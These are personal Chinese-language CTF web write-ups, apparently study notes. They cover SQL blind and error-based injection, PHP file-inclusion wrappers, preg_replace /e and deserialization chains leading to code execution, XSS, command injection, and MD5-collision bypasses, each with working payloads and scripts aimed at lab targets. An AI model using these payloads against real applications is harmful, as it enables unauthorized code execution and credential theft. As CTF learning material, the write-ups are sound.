            # 构造POST请求的参数：id=上面的payload（靶场注入点是id参数）
            post_data = {"id":payload}
            
            # 发送POST请求，把payload传给靶场的id参数
            res = requests.post(url=url,data=post_data)
            
            # 关键判断：如果页面返回内容里有"Hello"，说明匹配成功
            if 'Hello' in res.text:  
                flag += i  # 把匹配成功的字符i拼到flag里
                print(flag) # 实时打印当前已爆破的部分（看进度）
            else:
                continue  # 没匹配到，继续试下一个字符
    # 循环结束后，打印完整flag
    print(flag)
    
    # 3. 主程序入口（直接执行脚本时运行）
if __name__ == '__main__':
    # 靶场的目标URL
    url = 'http://bba3f6f0-b4cd-4c59-941b-9d84c8300332.node5.buuoj.cn:81/index.php'
    # 调用盲注函数，传入靶场地址开始爆破
    blind_injection(url)

```



## moectf 16 第十六章 昆仑星途 题解



`data://`伪协议，把 URL 里的代码内容当成 “虚拟文件” 让 PHP 解析执行

`f*`  是**通配符匹配**，平常如果不知道 flag 文件的完整名称可以用（linux）

```
<?php
error_reporting(0);
highlight_file(__FILE__);

include($_GET['file'] . ".php");   //   . 是拼接的意思
```

自动拼接

```
data://text/plain,<?php system('cat /f*');?>.php                             ?>   :  php只读到这里，houmianbuyunxing
```

```
data:text/plain,<?php system('cat /flag 文件的完整名称');//.php                ’//‘   ：  注释
```







data: 伪协议 代码就嵌在 URL 里，get就行

php://input 伪协议：得另外用post传代码。

举例:

- 用 data:        URL 里直接写`?file=data:text/plain,<?php 执行代码 ?>`，一步到位；   

  - ​			?file=data:数据类型,要执行的代码//			其中text/plain：指定数据类型 纯文本 

    ​										 `,`：分隔符

- 用 php://input：URL 里只写`?file=php://input`，然后在 POST 里单独传`<?php 执行代码 ?>`，分两步

    

  ```http
  POST /?file=php://input HTTP/1.1
  Host: 127.0.0.1:16898
  User-Agent: Mozilla/5.0
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 30
  
  <?php system('cat /f*');?>
  ```



```http
POST /?file=php://input HTTP/1.1
Host: 127.0.0.1:16898  # 你的目标地址和端口
User-Agent: Mozilla/5.0  # 浏览器标识，随便填
Accept: text/html,application/xhtml+xml,*/*
Content-Type: application/x-www-form-urlencoded  # 内容类型，可省略
Content-Length: 30  # 请求体的字符长度（下面代码的长度）

<?php system('cat /flag.txt');?>
```















## [BJDCTF2020]ZJCTF，不过如此

### 1   题解 c！

在 PHP 中，`preg_replace` 是一个强大的正则表达式替换函数。它可以在一个字符串中使用正则表达式搜索和替换指定的文本。

函数语法如下：
preg_replace($pattern, $replacement, $subject);

这里的 `$pattern` 是一个正则表达式字符串，用于指定搜索的模式， `$replacement` 是替换成的字符串， `$subject` 是要搜索和替换的原始字符串或字符串数组。

`preg_replace` 函数返回一个替换后的字符串或数组。



1.观察代码

```
<?php

error_reporting(0);         //关闭报错反馈，url中要有"text"参数，url中要有"file"参数
$text = $_GET["text"];
$file = $_GET["file"];
if(isset($text)&&(file_get_contents($text,'r')==="I have a dream")){       //存在$text参数  and  查找名称为$text的文件且文件内容为"I                                                严格等于                                                               have a dream"
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";     //回显获取的文件内容
    if(preg_match("/flag/",$file)){
        die("Not now!");
    }

    include($file);  //next.php               //文件包含，将名为$file的文件引入此php代码(后面的next.php注释就代表下个php就这文件了)
    
}
else{
    highlight_file(__FILE__);
}
?>
```

1.1 `isset()`：函数，意思是 “检查变量是否存在且不为空”。

判断 “你有没有传`text`参数”—— 如果没传`text`，或者传了但值是空的，就不满足这句话了

1.2 `r`是`read`（读取）的缩写，告诉 PHP：“我只想读取`$text`指向的内容，不做写入、修改等操作”

1.3 `file_get_contents()`能识别 PHP 伪协议，不用依赖服务器上的任何真实文件



2.理解：[]()

你现在需要一个现成的文件然后里面内容是：

但是没有现成的文件

所以我们构造一个，使用伪协议就ok

  伪协议使用：   php://input



3.使用

用burpsuite抓包改报头，伪协议使用php://input，格式如下 

```html
POST /..?参数=php://input



 



...



 



php代码
```

发现也没啥



4.继续，构造**$file**

前面代码分析过了**$file**的值极有可能是next.php，写上来试试

**POST** /?**text**=**php://input**&**file**=**next.php** **HTTP/1.1**



得到base64一堆密码，解码并读取

5.读取

```
<?php
$id = $_GET['id'];
$_SESSION['id'] = $id;

// 核心函数：用/e修饰符 会执行代码
function complex($re, $str) {
    return preg_replace(         
        '/(' . $re . ')/ei',        // $re是你传的参数名（正则），/ei会执行替换后的代码
        'strtolower("\\1")',        // \\1是匹配到的$str内容，会被当成代码执行
        $str                        // $str是你传的参数值
    );
}
// str 会被放进 \\1 里面，
  strtolower("\\1")会被放进 (' . $re . ') 里面
  变成  strtolower("str")



// 遍历所有GET参数：参数名→$re，参数值→$str
foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";  // 调用complex函数，触发preg_replace
}

// 目标函数：执行cmd命令
function getFlag(){
	@eval($_GET['cmd']);  // 只要调用这个函数，就能执行cmd参数
}
?>


```



6.构造

​    $re = 	S*   		 cmd

​    $str =	{${getFlag()}}       system('ls')

// str 会被放进 \\1 里面，
  strtolower("\\1")会被放进 (' . $re . ') 里面
  变成  strtolower("str")

1.得到strtolower("{${getFlag()}}")，遇到/e执行getFlag()

2.执行，因为cmd=system('ls')，所以

```
@eval($_GET[' cmd '])便变成了@eval(system('ls'))
```

`eval()`会把这个字符串当成 PHP 代码来运行

所以能得到ls显示结果

所以我们构造：

```plaintext
http://目标地址/next.php?\S*={${getFlag()}}&cmd=system('ls');
```

得到：相应内容；

以此类推，找到flag，cat它

bin dev etc flag home lib media mnt proc root run sbin srv sys tmp usr var system('ls ../../../../');

```plaintext
http://目标地址/next.php&\S*={${getFlag()}}&cmd=system('cat /flag');   //       cat /flag 表示读取根目录下的flag文件。
```

```bash
      (url).../next.php&\S*={${getFlag()}}&cmd=system('linux命令');
```







## Moe web 笑传之猜猜爆

源代码中：<script src="/static/main.js"></script> 

<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>猜数字游戏</title>
    <link rel="stylesheet" href="/static/style.css">
  </head>
  <body>
    <h1>猜数字游戏</h1>
    <p>我刚才随机选定了一个10000以内的自然数。你有多达 <b>1</b> 次的机会猜中它！我会告诉你猜的高了还是低了...（这好像没有用？对吗？哈哈哈哈）</p>
    <div class="form">
      <label for="guessField">请猜数：</label>
      <input type="number" id="guessField" class="guessField" min="1" max="10000">
      <button id="guessBtn">我猜</button>
    </div>
    <div class="resultParas">
      <p class="guesses"></p>
      <p class="lastResult"></p>
      <p class="lowOrHi"></p>
      <p class="flagResult"></p>
    </div>
    <script src="/static/main.js"></script>
  </body>
</html>


1.进入/static/main.js

看到

```
 if(userGuess === randomNumber) {
    lastResult.textContent = '恭喜你！猜对了！';
    lastResult.style.backgroundColor = 'green';
    lowOrHi.textContent = '';
    guessField.disabled = true;
    guessBtn.disabled = true;
    // 猜对后请求flag
    fetch(' if(userGuess === randomNumber) {
    lastResult.textContent = '恭喜你！猜对了！';
    lastResult.style.backgroundColor = 'green';
    lowOrHi.textContent = '';
    guessField.disabled = true;
    guessBtn.disabled = true;
    // 猜对后请求flag
    fetch('/flag', {method: 'POST'})
      .then(res => res.json())
      .then(data => {
        document.querySelector('.flagResult').textContent = "FLAG: " + data.flag;
      });
    setGameOver();', {method: 'POST'})
      .then(res => res.json())
      .then(data => {
        document.querySelector('.flagResult').textContent = "FLAG: " + data.flag;
      });
    setGameOver();
```

得知：POST直接去/flag,得到flag





##  moectf web 01 第一章 神秘的手镯_revenge

``

K皇：咳咳...其实当年飞升后，为了防止你偷偷看我收藏的小秘密，我重新设置了一个密码放在wanyanzhou.txt里面了......但是我忘记密码是啥了，而且不小心把保存密码的文件删了......

HDdss：这...应该有备份吧？

K皇：确实有，不过当时着急忘记了...输入太多错误密码，手镯直接锁死了，要连续输入500遍正确密码才能打开。

``

源代码：

| <div class="challenge">                                      |
| ------------------------------------------------------------ |
| <p class="hint">「以万言咒启封，禁取巧之道」</p>             |
| <div class="input-area">                                     |
| <textarea id="passwordInput"                    //这里有id="passwordInput" |
| placeholder="在此结印输入万言启封咒...">在此输入万言启封咒</textarea> |
| <div class="warning">粘贴禁止！请手动输入！</div>            |
| </div>                                                       |
| <button id="unsealButton">启封手镯</button>                                            //这里有个button id="unsealButton" |
|                                                              |
| <!-- 验证结果区域 -->                                        |
| <div id="result"></div>                                      |
| </div>                                                       |
|                                                              |

1.访问 wanyanzhou.txt.bak，下载打开，得到密码

2.发现不能复制粘贴，就去控制台执行脚本

（难怪为什么老是执行不了，这设置了 debugger 设置断点来阻止自动化脚本，可以关闭）

知识点：

​	1.`setInterval(函数, 时间)`： **“每隔 X 毫秒重复执行这个函数里的代码”**，比如 `setInterval(function(){alert('hi')}, 1000)` 就是每隔 1 秒弹一次 “hi”。

​	2.自动执行函数

```javascript
(function() {
    // 里面的代码
})();
```



脚本：

```
(function() {
    // 1. 把文本内容定义好（就是你要输入的密码）
    var text = "你要输入的密码";
    var count = 500; // 要点击的次数
    var i = 0;

    // 2. 定时重复执行：每次点击前重新填内容+点击
    var interval = setInterval(function() {
        // 每次都重新获取元素（避免页面加载问题）
        var input = document.getElementById("passwordInput");  //寻找页面里叫做passwordInput的东西，把他保存在input里面
        var button = document.getElementById("unsealButton");
        
        if (i >= count) { // 达到次数就停止
            clearInterval(interval);
            return;
        }
        
        if (input && button) { // 这俩元素都在吗，在的话值为1，运行
            input.value = text; // 先填内容（抵消“点击清空”的坑）
            button.click(); // 再点击按钮
        }
        
        i++;
    	}, 10); // 每10毫秒执行一次（快速重复）
})();

```



## moectf web 04 第四章 金曦破禁与七绝傀儡阵 题解

1.get传参

`url+stone_golem?key=xdsec`

这里有个疑问为什么不是`/?key=xdsec`

是因为这里的stone_golem是个文件不是个目录

​	后端文件路径：`/var/www/html/stone_golem.php` → 访问 `stone_golem?key=xdsec`（省略`.php`）；

​	后端目录路径：`/var/www/html/stone_golem/` → 访问 `stone_golem/?key=xdsec`（加`/`指向目录）。

获得玉简碎片: bW9lY3Rme0Mw

2.post传参

bp改post，传入参数

获得玉简碎片: bjZyNDd1MTQ3

3.本地访问

X-Forwarded-For:127.0.0.1

| 请求头字段（英文） | 解释                                                         | 举个例子                                                     |
| ------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ |
| Host               | 告诉服务器 “我要访问你哪个网站”（一台服务器可能有多个网站，靠这个区分） | 比如访问百度，Host 就是`www.baidu.com`                       |
| User-Agent         | 告诉服务器 “我用的啥设备 / 浏览器”（比如你是用手机还是电脑，用 Chrome 还是 Edge） | 比如`Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0`（代表 Windows 电脑 + Chrome 浏览器） |
| Referer            | 告诉服务器 “我是从哪个页面跳过来的”                          | 从`www.baidu.com`点进知乎，Referer 就是`www.baidu.com`       |
| Cookie             | 服务器给你的 “身份小票”（存着你的登录状态、账号信息，下次访问直接带过去，服务器就知道你是谁了） | 比如`user_id=123; token=abc123`（代表你是 123 号用户）       |
| X-Forwarded-For    | 告诉服务器 “请求的真实来源 IP 是什么”                        | 比如`192.168.1.100`（你的本地 IP）                           |
| Accept             | 告诉服务器 “我能接收啥格式的内容”（比如要网页还是图片）      | 比如`text/html,image/png`（要网页和图片）                    |
| Accept-Encoding    | 告诉服务器 “我能解压啥压缩格式”（节省传输流量）              | 比如`gzip, deflate`（支持这两种压缩）                        |
| Accept-Language    | 告诉服务器 “我能看懂啥语言”（比如要中文还是英文页面）        | 比如`zh-CN,zh;q=0.9`（优先中文）                             |

获得玉简碎片: MTBuNV95MHVy

4.修改浏览器

改成`user-agent：moe browser`

获得玉简碎片: X2g3N1BfbDN2

5.需要以xt的身份认证user!

Cookie： use=xt

获得玉简碎片: M2xfMTVfcjM0

6.你从哪里来

改成：**Referer**: http://panshi/entry

获得玉简碎片: bGx5X2gxOWgh

7.put请求

使用PUT方法，请求体为"新生！"

用curl构造请求

获得玉简碎片: fQ==

拼接：

bW9lY3Rme0MwbjZyNDd1MTQ3MTBuNV95MHVyX2g3N1BfbDN2M2xfMTVfcjM0bGx5X2gxOWghfQ==

解码：

moectf{C0n6r47u14710n5_y0ur_h77P_l3v3l_15_r34lly_h19h!}



## moectf web 06 第六章 藏经禁制？玄机初探！

账号密码题目，万能密码破解

得flag



## moectf web 07 第七章 灵蛛探穴与阴阳双生符



1.**robots.txt**：

它就像网站给搜索引擎爬虫立的 “家规”

放在网站根目录下（比如`https://xxx.com/robots.txt`）

纯文本格式，写清楚 “哪些页面你能爬、哪些不能爬”。



`robots.txt`具体页面：

```plaintext
User-agent: *  # 对所有爬虫生效
Disallow: /admin/  # 禁止爬/admin/后台页面
Allow: /article/  # 允许爬/article/文章页面
```

2.md5是啥

答：MD5 是一种**哈希算法**，能把任意长度的内容转换成固定 128 位（32 个字符）的哈希值（比如`123`的 MD5 是`202cb962ac59075b964b07152d234b70`）。正常情况下不同内容的 MD5 值不同，但存在**MD5 碰撞**—— 即两个不同的内容，MD5 值完全一样。

规定：MD5参数必须是字符串



3.`?? ""`：如果 URL 里传了`a`参数，`$a`就等于传的值；没传`a`参数的话，`$a`就等于空字符串（避免报错）。



##### 题目：省流：有这样一个文件，它是一个存放在网站根目录下的纯文本文件，用于告知搜索引擎**爬虫**哪些页面可以抓取，哪些页面不应被抓取。它是网站与搜索引擎之间的 “协议”，帮助网站管理爬虫的访问行为，保护隐私内容、节省服务器资源或引导爬虫优先抓取重要页面。



1.去访问robots.txt

得：

```
User-agent: *
Disallow: /flag.php
```

2.访问：/flag.php

得

```
<?php
highlight_file(__FILE__);
$flag = getenv('FLAG');

$a = $_GET["a"] ?? "";
$b = $_GET["b"] ?? "";

if($a == $b){
    die("error 1");		//a和b数值要不一样
}

if(md5($a) != md5($b)){	//a和b哈希值要一样
    die("error 2");
}

echo $flag
```

所以我们就要传a，b上去，并给他们赋值，要求：a和b数值要不一样；a和b哈希值要一样

?a=...&b=...

```
?a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
```

1. %4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
2. %4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2





## **PHP 反序列化漏洞**

## moectf web 09 第九章 星墟禁制·天机问路

题目：让你输入url

1.随便输一个，发现网址变成

http://127.0.0.1:62792/?url=www.baidu.com

那么`;`直接闭合它，再后面加上指令

ls -l

发现没有任何信息，猜测再env里面

输入`1;env`,得到

```
KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443
PHPIZE_DEPS=autoconf 		dpkg-dev dpkg 		file 		g++ 		gcc 		libc-dev 		make 		pkgconf 		re2c
KUBERNETES_SERVICE_HOST=10.43.0.1
PWD=/app
PHP_SHA256=475f991afd2d5b901fb410be407d929bc00c46285d3f439a02c59e8b6fe3589c
FLAG=moectf{bf86146f-bae834}
```









## 17 第十七章 星骸迷阵·神念重构

诶哟，我真的要杀人了，鬼题目炒了几个答案都是错的

```
<?php
highlight_file(__FILE__); // 显示当前代码，方便看结构

class A {
    public $a; // 可控的属性，用来注入恶意代码
    function __destruct() { // 对象销毁时触发
        eval($this->a); // 执行$a属性里的代码（核心执行点）
    }
}

if(isset($_GET['a'])) { // 接收GET参数a
    unserialize($_GET['a']); // 把参数a的字符串还原成对象
}
?>
```

代审：把命令行输给a就ok



但是输入：http://127.0.0.1:46309/?a=ls%20flag后得到了：

```
Notice**: unserialize(): Error at offset 0 of 7 bytes in **/app/index.php** on line **12**
```

这个报错的核心意思是：**你传给`unserialize()`的字符串（共 7 字节），从第 0 位（第一个字符）开始就不符合 PHP 序列化格式，反序列化函数根本没法解析**。

对不起没看到这里：

```
if(isset($_GET['a'])) {
    unserialize($_GET['a']);
}
```

知识点1：

`unserialize()`反序列化：（后端拿到a后反序列化，那么我们只要序列化就ok）

序列化格式：

```
O:类名长度:"类名":属性数量:{s:属性名长度:"属性名";s:指令长度:"要执行的指令";}
```

很麻烦可以直接写脚本：

脚本1：

```php
<?php
// 1. 定义和题目完全一样的类A
class A {
    public $a; // 属性名必须和题目一致
}

// 2. 创建对象，给$a赋值为读flag的代码
$obj = new A();
// 选哪种代码？看环境：
// - 想先验证链路：$obj->a = "phpinfo();";（调出PHP信息面板）
// - 想直接读flag：$obj->a = "system('cat /flag');";（执行系统命令读flag）
$obj->a = "system(\"cat /flag\");"; // ’\‘是为了转义，不然前面一个引号后面闭合他以为语句就结束了

echo serialize($obj); // 输出：O:1:"A":1:{s:1:"a";s:20:"system("cat /flag");";}

?>
```



`__destruct()方法`

对象销毁时触发

```
这行代码执行完后，$obj没有任何其他地方引用（没有赋值给其他变量、没有后续调用），PHP判定「这个对象没用了」；
PHP准备销毁$obj，触发A类的__destruct()方法；
__destruct()里的eval($this->a)执行，也就是执行system("cat /flag");
```



脚本2：

```
<?php
highlight_file(__FILE__);

class A {
    public $a='system("cat /flag");';
    function __destruct() {
        eval($this->a);
    }
}

$b=new A;
$c=serialize($b);
echo $c;
```







new：

`new` 是 PHP 里「创建对象」的关键字 —— 没有 `new`，就造不出 `A` 类的实例对象

A是设计图纸，new A才是能用的实体物品



##### 解题思路：

1.代审发现我们需要 以序列化的格式 ，给a传参

2.构造序列化的`'system("\cat /flag\");'`

​	`system()`：PHP 的**系统命令执行函数**

​	PHP 本身不能直接执行`cat /flag`，必须通过`system()`这类函数 “桥接”—— 把系统命令作为参数传给`system()`，PHP 才会调用系统	去执行这个命令。

​	引号：PHP 里，所有要执行的代码 / 文本，只要是 “字符串形式”，就必须用引号（单引号`'`或双引号`"`）包裹

3.拼接url







## 18 第十八章 万卷诡阁·功法连环

```
<?php
highlight_file(__FILE__);

class PersonA {
  private $name;
  function __wakeup() {
    $name=$this->name;
    $name->work();
  }
}

class PersonB {
  public $name;
  function work(){
    $name=$this->name;
    eval($name);
  }

}

if(isset($_GET['person'])) {
  unserialize($_GET['person']);  //person只是参数名，接收方查看人的名字，不用管他；我一直认为这里要改成name，其实不用
}
```



```php
<?php
highlight_file(__FILE__);
 
class PersonA {
        public $name;
        public function __construct() {
        $this->name = new PersonB();
    }
    function __wakeup() {
        $name=$this->name;
        $name->work();
    }
}
 
class PersonB {
    public $name;
    public function __construct() {
        $this->name = "system('ls /');";
    }
 
}
$A = new PersonA();
echo serialize($A);
```















## 19 第十九章 星穹真相·补天归源





```
 <?php
highlight_file(__FILE__);

class Person
{
    public $name;
    public $id;
    public $age;

    public function __invoke($id)
    {
        $name = $this->id;
        $name->name = $id;
        $name->age = $this->name;
    }
}

class PersonA extends Person
{
    public function __destruct()
    {
        $name = $this->name;
        $id = $this->id;
        $age = $this->age;
        $name->$id($age);
    }
}

class PersonB extends Person
{
    public function __set($key, $value)
    {
        $this->name = $value;
    }
}

class PersonC extends Person
{
    public function __Check($age)
    {
        if(str_contains($this->age . $this->name,"flag"))
        {
            die("Hacker!");
        }
        $name = $this->name;
        $name($age);
    }

    public function __wakeup()
    {
        $age = $this->age;
        $name = $this->id;
        $name->age = $age;
        $name($this);
    }
}

if(isset($_GET['person']))
{
    $person = unserialize($_GET['person']);
} 
```



```
<?php
class PersonA {
    public $name;
    public $id;
    public $age;
}
class PersonC {
    public $name;
    public $id;
    public $age;
}

$pc = new PersonC();
$pc->name = 'system';
$pc->age = "";
$pa = new PersonA();
$pa->name = $pc;
$pa->id = '__Check';
$pa->age = 'cat /flag';
echo urlencode(serialize($pa));
?>
```









## sqli-5题解

对于怎样输入都没有回显位的题目，考虑[报错注入]，这样我们就可以通过报错和获取信息



1.判断有无注入点 

?id=1 ?id=1' ，两个页面返回不一样，说明没有过滤`'`,存在注入点

2.判断注入类型：

```cobol
//判断字符型
?id=1' and '1'='1
?id=1' and '1'='2

//判断数字型      
?id=1 and 1=1
?id=1 and 1=2
```

3.判断有几个字段

（为什么要判断，因为要让数据库允许你插入，就要让你自己的select列数=原始后台select列数

像这样：

【原始查询】     SELECT a, b, c FROM xxx
【你注入的查询】 UNION SELECT x, y, z）



?id=1' order by 3--+

?id=1' order by 4--+



4.确定回显位

?id=-1' union select 1,2,3--+

发现没有报错，也没回显，用报错注入

5.报表名(必须写0x7e，~在语法里面是另外一种意思)

```
?id=1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))--+
```



```
XPATH syntax error: '~emails,referers,uagents,users~'
```

6.报列名

```
?id=1' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e))--+
```

```
XPATH syntax error: '~id,username,password~'
```

7.报具体数据

```
select group_concat(username,'~',password) from users
```

```
?id=1' and extractvalue(1,concat(0x7e,(select group_concat(username,0x7e,password) from users),0x7e))--+
```

```csharp
XPATH syntax error: '~Dumb~Dumb,Angelina~I-kill-you,D'
```



# xss

## [第二章 web进阶]XSS闯关 1 

## 题解

### 第一关：

http://feeb9918-1100-446f-bc56-9c005eeb90ab.node5.buuoj.cn:81/level1?username=xss

```
<script>alert('xss')</script>
```

### 第二关：

发现输入后没有回显，现在开始代审吧

```
<body>
    <div id="root" class="app-wrapper amis-scope"><div class="amis-routes-wrapper"><div class="a-Toast-wrap a-Toast-wrap--topRight"></div><div class="a-Page"><div class="a-Page-content"><div class="a-Page-main"><div class="a-Page-header"><h2 class="a-Page-title"><span class="a-TplField">XSS test platform</span></h2></div><div class="a-Page-body"><span class="a-TplField">
    	<div id="ccc">
    		                 //这里很重要，有东西等会会被放进来
    	</div>
    </span></div></div></div></div></div></div>
    <script type="text/javascript">
    	if(location.search == ""){
    		location.search = "?username=xss"
    	}
    	var username = 'xss';
    	document.getElementById('ccc').innerHTML= "Welcome " + escape(username);
    </script>

</body></html>
```

1.`escape()`：**只转义「特殊字符」，普通字母 / 数字不处理**

- 若`username`是`<script>`，`escape()`会转成：`%3Cscript%3E`；

- 转义后的字符串通过`innerHTML`渲染时，会被当成 “普通文本” 而非 “HTML/JS 代码”，无法执行恶意脚本。

- 3.`document.getElementById('xxx')` 作用是：

  **在整个页面中，找到唯一的、`id` 属性等于 `xxx` 的 HTML 元素**。

2. `innerHTML`：JS 给 DOM 元素 “塞内容” 的方式，但它有个 “危险特性”：**会把字符串当成 HTML 代码解析，而不是纯文本**。

​            `<div id="ccc">Welcome username</div>

3.`document.getElementById('xxx')` 作用是：

**在整个页面中，找到唯一的、`id` 属性等于 `xxx` 的 HTML 元素**。

所以我们只要在var username = 'xss';这句话里面插入payload就行，

因为执行顺序：后端js拿到username数据，放进去，再把代码返回给前端

​	    前端拿到代码后，一句一句执行，我们在var username = 'xss';这句话中就弹窗，就不用管后面的`document.getElementById('ccc').innerHTML= "Welcome " + escape(username);`这句话了

输入 username=1';alert('1');//

拼接后变成：var username = '1';      alert(1);      //





## 11 第十一章 千机变·破妄之眼

省流：HDdss看到了 **GET**  参数名由`m,n,o,p,q`这五个字母组成（每个字母出现且仅出现一次），长度正好为 5，虽然不清楚字母的具体顺序，但是他知道**参数名等于参数值**才能进入。



import itertools
import requests

for p in itertools.permutations("mnopq"):
    k = "".join(p)
    r = requests.get("http://127.0.0.1:48386/", params={k: k})
    if "flag" in r.text:
        print(k)
        print(r.text)
        break



![image-20251218152437400](/images/image-20251218152437400.png)







## [安洵杯 2019]easy_web

### 1



整个网页就个图片，但是我们发现url有点东西

![image-20260122202902191](/images/image-20260122202902191.png)

img后面跟着乱七八糟的东西，还有一个cmd，那我们就很想利用一下了

直接试了ls，cat发现都被过滤了；而且还发现一直有个提示：md5 is fun



![image-20260122203011054](/images/image-20260122203011054.png)

看了一下源代码，发现有个base64

于是我把url上面奇怪的字符串用base转了两下，得到16进制，16进制再转utf-8，得到 图片名字 555.png

### <img src="C:\Users\21709\Pictures\Screenshots\屏幕截图 2026-01-22 194211.png" alt="屏幕截图 2026-01-22 194211" style="zoom: 50%;" />





<img src="C:\Users\21709\AppData\Roaming\Typora\typora-user-images\image-20260122194100421.png" alt="image-20260122194100421" style="zoom: 67%;" />



因为在cmd无值的情况下我们仍然在返回页面看到了png，所以先不管cmd；

或许我们是否可以在img传入我们想要看到的文件，

比如源码index.php，但是这里需要刚刚相反的进制转换：

hex*4->

696e6465782e706870

base64*2->->

TmprMlpUWTBOalUzT0RKbE56QTJPRGN3



得到一堆base64，转码得到：



```
<?php
error_reporting(E_ALL || ~ E_NOTICE);	//错误被隐藏，后续img和cmd不传参导致的错误不再显示
header('content-type:text/html;charset=utf-8');
$cmd = $_GET['cmd'];
if (!isset($_GET['img']) || !isset($_GET['cmd'])) 
    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');
$file = hex2bin(base64_decode(base64_decode($_GET['img'])));

$file = preg_replace("/[^a-zA-Z0-9.]+/", "", $file);
if (preg_match("/flag/i", $file)) {
    echo '<img src ="./ctf3.jpeg">';
    die("xixi～ no flag");
} else {
    $txt = base64_encode(file_get_contents($file));
    echo "<img src='data:image/gif;base64," . $txt . "'></img>";
    echo "<br>";
}
echo $cmd;
echo "<br>";
if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)) {
    echo("forbid ~");
    echo "<br>";
} else {
    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {
        echo `$cmd`;
    } else {
        echo ("md5 is funny ~");
    }
}

?>
<html>
<style>
  body{
   background:url(./bj.png)  no-repeat center center;
   background-size:cover;
   background-attachment:fixed;
   background-color:#CCCCCC;
}
</style>
<body>
</body>
</html>
```



小知识点：

**`E_ALL || ~ E_NOTICE`**。

- **`~ E_NOTICE`**： `~` 是按位取反运算符。在二进制层面，`E_NOTICE` 的位被置 0，其余位全部置 1。
- **`||`**： 这是**逻辑或**（Logical OR），不是位或（Bitwise OR `|`）。 在 PHP 中，`E_ALL` 是一个非零整数（True），`~ E_NOTICE` 也是一个非零整数（True）。 **`True || True` 的结果永远是布尔值 `1`。**





```
if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {
        echo `$cmd`;
    } else {
        echo ("md5 is funny ~");
    }
}
```

重点：

post传参a，b，MD5强比较绕过



1.string会强制转换，所以不能传入数组，因为被转换后变成array，值就相等了；

2.!==：值不一样 || 类型不一样 （二选一满足即可）

3.===值和类型都一样



传入a和b满足值不一样，但是md5过后的值和类型都要一样

```
a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
```



```
b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
```

考虑过滤，用dir代替ls

```
curl -X -POST "http://e220bba8-1583-48f3-aa75-54e78da3e6f1.node5.buuoj.cn:81/index.php?img=&cmd=dir+/" -d "a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2"
```



![image-20260122202647944](/images/image-20260122202647944.png)



看到flag，考虑绕过，用ca\t flag

![image-20260122202713163](/images/image-20260122202713163.png)
